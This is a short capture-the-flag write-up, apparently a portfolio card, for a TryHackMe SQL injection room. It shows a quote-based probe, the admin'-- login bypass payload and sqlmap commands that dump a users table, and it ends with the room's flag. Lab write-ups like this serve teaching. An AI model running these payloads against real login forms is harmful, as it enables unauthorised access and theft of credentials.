SQL Injection — Basic Authentication Bypass
TryHackMe EASY ⚡ 200 pts
[ EXPAND ]
Bypassed login authentication using classic SQL injection. The login form was vulnerable to unsanitized input, allowing authentication bypass without valid credentials.
STEP 1 — Identify Injection Point
# Test input field with single quote
Username: admin'
Response: SQL Error — You have an error in your SQL syntax
# Confirmed SQL injection vulnerability!
STEP 2 — Authentication Bypass
Username: admin'--
Password: anything
# -- comments out the rest of SQL query
# Original query becomes: SELECT * FROM users WHERE user='admin'--' AND pass='anything'
STEP 3 — Extract Data with SQLMap
$ sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs
$ sqlmap -u "http://target.com/login" -D webapp -T users --dump
🚩 FLAG: THM{sql_1nj3ct10n_byp4ss_succ3ss}
SQL Injection Authentication Bypass SQLMap Web Security

TryHackMe EASY ⚡ 150 pts
[ EXPAND ]
